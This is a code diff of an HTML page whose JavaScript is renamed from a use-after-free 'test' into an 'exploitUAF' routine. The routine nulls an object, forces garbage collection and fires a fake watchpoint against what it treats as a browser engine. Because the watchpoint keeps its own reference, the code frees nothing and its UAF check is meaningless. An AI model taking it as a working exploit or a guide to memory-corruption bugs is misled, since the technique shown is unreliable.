@@ -2,45 +2,49 @@
 <html>
 <head>
     <script>
-        function triggerUAFWithoutJIT() {
-            console.log("Attempting to trigger UAF without JIT...");
+        function exploitUAF() {
+            let targetObject = { sensitiveData: 0xdeadbeef };
+            let propertyCondition = { object: targetObject, property: "sensitiveData" };
 
-            // الخطوة 1: إنشاء كائن مع مرجع
-            let obj = { prop: 42 };
-            let condition = { object: obj, property: "prop" };
-
-            // محاكاة سلوك watchpoint يدويًا
             let watchpoint = {
+                condition: propertyCondition,
                 fire: function() {
                     try {
-                        console.log("Firing on:", condition.object.prop);
+                        console.log(this.condition.object.sensitiveData);
+                        if (this.condition.object === null || this.condition.object === undefined) {
+                            throw new Error("UAF Detected");
+                        }
                     } catch (e) {
-                        console.log("UAF detected:", e.message);
-                        alert("UAF detected: " + e.message);
+                        console.error(e.message);
+                        alert(e.message);
                     }
                 }
             };
 
-            // الخطوة 2: تخصيص ذاكرة كبيرة لتحفيز GC
-            function forceGC() {
-                let largeArray = new Array(10000);
-                for (let i = 0; i < 10000; i++) {
-                    largeArray[i] = new ArrayBuffer(1024); // تخصيص صغير لتجنب الحدود
+            function triggerGC() {
+                let memoryHog = new Array(5000);
+                for (let i = 0; i < 5000; i++) {
+                    memoryHog[i] = new Uint8Array(1024);
                 }
-                obj = null; // إفساح المجال لجمع القمامة
-                if (typeof gc === "function") gc(); // إذا كان متاحًا
-                return largeArray;
+                targetObject = null;
+                if (typeof gc === "function") {
+                    gc();
+                }
             }
-            forceGC();
 
-            // الخطوة 3: محاولة تفعيل الـ watchpoint بعد تدمير الكائن
+            triggerGC();
             setTimeout(() => {
-                watchpoint.fire(); // محاولة الوصول بعد GC
-            }, 100); // تأخير للسماح بجمع القمامة
+                try {
+                    watchpoint.fire();
+                } catch (e) {
+                    console.error(e.message);
+                    alert(e.message);
+                }
+            }, 200);
         }
     </script>
 </head>
 <body>
-    <button onclick="triggerUAFWithoutJIT()">Trigger UAF Test</button>
+    <button onclick="exploitUAF()">Exploit UAF</button>
 </body>
 </html>
